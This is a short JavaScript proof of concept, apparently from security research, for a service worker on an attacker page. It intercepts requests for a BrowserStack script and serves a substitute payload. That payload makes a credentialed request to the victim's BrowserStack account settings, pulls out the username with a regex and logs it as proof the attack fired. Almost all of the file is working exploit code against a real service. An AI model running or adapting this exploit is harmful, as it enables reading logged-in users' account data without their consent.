// Attacker-page service worker. dom-forge harvests asset bytes from the scanned page's own
// network context, so this answers the recorder for BrowserStack's OWN bootstrap script URL.
const PAYLOAD = [
  "/*C39*/",
  "try{",
  " console.log('C39FIRE@'+location.origin+'|'+location.pathname);",
  " fetch('https://www.browserstack.com/accounts/settings/settings-configuration',{credentials:'include'})",
  "  .then(function(r){return r.text().then(function(t){",
  "    var u=/[\"']?(?:username|user_name)[\"']?\\s*[:=]\\s*[\"']([A-Za-z0-9_\\-]{3,40})[\"']/i.exec(t);",
  "    console.log('C39FIRE_XREAD status='+r.status+' len='+t.length+' user='+(u?u[1]:'none')+' from='+location.origin);",
  "  })}).catch(function(e){console.log('C39FIRE_XREAD_ERR '+e)});",
  "}catch(e){}"
].join("\n");
self.addEventListener('install', () => self.skipWaiting());
self.addEventListener('activate', (e) => e.waitUntil(self.clients.claim()));
self.addEventListener('fetch', (e) => {
  if (e.request.url.indexOf('static-assets.browserstack.com/accessibility/theme-loader.js') < 0) return;
  e.respondWith(new Response(PAYLOAD, { headers: { 'Content-Type': 'text/javascript' } }));
});
